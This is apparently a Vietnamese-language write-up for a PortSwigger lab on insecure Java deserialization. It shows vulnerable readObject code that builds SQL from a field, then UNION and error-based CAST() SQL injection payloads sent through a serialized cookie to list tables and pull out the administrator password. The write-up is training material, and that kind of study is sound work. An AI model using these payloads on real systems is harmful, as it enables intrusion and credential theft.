# Target Goal: 

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the `administrator` and delete `carlos`.

Credentials: `wiener:peter`

# Recon: 

Sau khi login vào, ta sẽ có cookie được serialize bởi java:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/2ad560ff-0986-458a-9362-a0f1cf6379aa)

Bên `Site-map` cũng bắt được 1 path ẩn:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/2dad6dd7-bb6e-4479-bddd-d9ce059a34ac)

Lui xuống ta có 1 file có nội dung như sau:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/81175d68-0891-420d-af8b-d7405bb616be)

Ta rút được vài chú ý về src code và nó đang dùng `postgresql`:

```
public ProductTemplate(String id)
    {
        this.id = id;
    }

private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ...
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
        ...
    }
```

Tiếp theo là tạo [Payload](https://github.com/vanniichan/Portswigger/tree/main/Insecure%20deserialization/Lab_8/Payload) thực hiện SQLi thông qua tham số `id`.

`ProductTemplate prodTemplate = new ProductTemplate("' UNION SELECT NULL -- ");`

Compile và thực thi code, ta nhận được serialized object.

![image](https://github.com/vanniichan/Portswigger/assets/112863484/33fcfced-4c97-45af-bd69-5c9ff53cb4bf)

Error trả về của postgresql báo UNION phải cùng số cột với câu query trước → Ta đã có thể đảm bảo rằng ta có thể SQLi thành công.

![image](https://github.com/vanniichan/Portswigger/assets/112863484/ff366856-b9dd-4794-a2db-7b74ca78605e)

Giờ mò đúng số cột (8) và tiếp tục tìm tên table:

```
' UNION SELECT NULL, NULL, NULL, CAST(table_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.tables --

///tận dụng CAST() để trả về nội dung các trường cần xem thông qua lỗi
```
![image](https://github.com/vanniichan/Portswigger/assets/112863484/a9012491-9b98-46cf-8508-931f8da13015)

Có table rồi thì giờ tìm cột:

```
' UNION SELECT NULL, NULL, NULL, CAST(column_name AS INTEGER), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name= 'users' --

///tận dụng CAST() để trả về nội dung các trường cần xem thông qua lỗi
```

![image](https://github.com/vanniichan/Portswigger/assets/112863484/15ce9978-797b-4d2d-acdb-ade62acaee1d)

Bây giờ chỉ cần tìm password với `username = administrator`:

```
' UNION SELECT NULL, NULL, NULL, CAST(password AS INTEGER), NULL, NULL, NULL, NULL FROM users WHERE username = 'administrator'-- 

```
![image](https://github.com/vanniichan/Portswigger/assets/112863484/9dc91a6c-a265-4ffc-af0b-a346eea868bd)

`administrator:5i91028uxwa4odk6dcay`

![image](https://github.com/vanniichan/Portswigger/assets/112863484/b43ab330-2ceb-4d3d-bd79-61b39cd0284f)

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/82f8e892-3cc7-4a65-a0ff-55463da4019b)
